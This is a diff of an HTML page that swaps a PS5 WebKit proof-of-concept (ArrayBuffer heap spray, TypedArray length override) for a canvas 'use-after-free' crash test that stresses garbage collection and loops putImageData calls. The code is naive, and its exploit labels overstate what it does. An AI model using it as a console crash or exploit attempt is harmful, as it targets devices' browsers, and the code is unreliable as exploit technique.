@@ -1,57 +1,85 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>PS5 10.20 WebKit PoC</title>
+  <meta charset="UTF-8">
+  <title>PS5 4.03 Canvas UAF Crash Test</title>
   <style>
-    body {
-      background: #111;
-      color: #0f0;
-      font-family: monospace;
-      padding: 20px;
-    }
-    #log {
-      white-space: pre-wrap;
-      font-size: 16px;
-      color: #0f0;
-    }
+    body { font-family: monospace; background: #111; color: #eee; padding: 10px; }
+    button { font-size: 16px; padding: 10px; }
+    #log { margin-top: 10px; white-space: pre-wrap; background: #222; padding: 10px; border: 1px solid #444; max-height: 300px; overflow-y: auto; }
   </style>
 </head>
 <body>
-  <h1>🧪 PS5 10.20 WebKit PoC (sin WebAssembly)</h1>
-  <div id="log">Iniciando...</div>
+  <h2>PS5 Canvas UAF / Crash Trigger</h2>
+  <button onclick="startCrash()">Start Crash Loop</button>
+  <div id="log"></div>
+  <canvas id="canvas" width="512" height="512" style="display:none;"></canvas>
 
   <script>
-    const log = msg => {
-      document.getElementById("log").textContent += "\n" + msg;
-      console.log(msg);
-    };
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const logDiv = document.getElementById('log');
 
-    try {
-      log("[+] Comenzando heap grooming...");
+    function log(msg) {
+      logDiv.textContent += msg + "\n";
+      logDiv.scrollTop = logDiv.scrollHeight;
+    }
 
-      let spray = [];
-      for (let i = 0; i < 0x1000; i++) {
-        let arr = new ArrayBuffer(0x100);
-        let view = new Uint32Array(arr);
-        view[0] = 0x41414141;
-        spray.push(view);
+    function stressGC() {
+      for (let i = 0; i < 1000; i++) {
+        new ArrayBuffer(2 * 1024 * 1024);
+      }
+    }
+
+    function mutateImageData(imageData) {
+      const buf = new Uint8Array(imageData.data.buffer);
+      for (let i = 0; i < buf.length; i += 4) {
+        buf[i] = Math.random() * 255;     // R
+        buf[i+1] = Math.random() * 255;   // G
+        buf[i+2] = Math.random() * 255;   // B
+        buf[i+3] = 255;                   // A
+      }
+    }
+
+    function rapidAbuse(imageData) {
+      let run = true;
+      setTimeout(() => run = false, 10000); // Stop after 10s
+
+      function loop() {
+        if (!run) return;
+        try {
+          mutateImageData(imageData);
+          ctx.putImageData(imageData, 0, 0);
+          const img = ctx.getImageData(0, 0, 512, 512);
+          const temp = new Uint8Array(img.data.buffer);
+        } catch (e) {
+          log("Exception: " + e.message);
+        }
+        setTimeout(loop, 0);
       }
 
-      log("[+] Heap grooming completo.");
-      
-      // Prueba básica de corrupción (esto no causa crash directo pero sirve como test).
-      log("[*] Intentando manipular longitud de un TypedArray...");
+      for (let i = 0; i < 8; i++) loop(); // Start multiple loops
+    }
 
-      let victim = new Uint8Array(0x100);
-      let fakeLength = { valueOf: () => { log("[!] valueOf() ejecutado"); return 0x200; } };
+    async function startCrash() {
+      log("Starting Canvas UAF crash attempt...");
+      let refImageData = ctx.createImageData(512, 512);
+      for (let i = 0; i < refImageData.data.length; i++) refImageData.data[i] = 0x41;
 
-      victim.length = fakeLength; // Esto no tiene efecto pero nos permite saber si JSCore permite override raros.
+      stressGC();
 
-      log("[+] PoC ejecutado. Si ves esto, no se bloqueó el navegador.");
+      // Fill canvas repeatedly
+      const drawInterval = setInterval(() => {
+        ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+        ctx.fillRect(0, 0, 512, 512);
+      }, 1);
 
-    } catch (e) {
-      log("[!] Excepción capturada: " + e);
+      // Simulate UAF scenario
+      setTimeout(() => {
+        clearInterval(drawInterval);
+        rapidAbuse(refImageData);
+        log("Heap abuse started...");
+      }, 2000);
     }
   </script>
 </body>
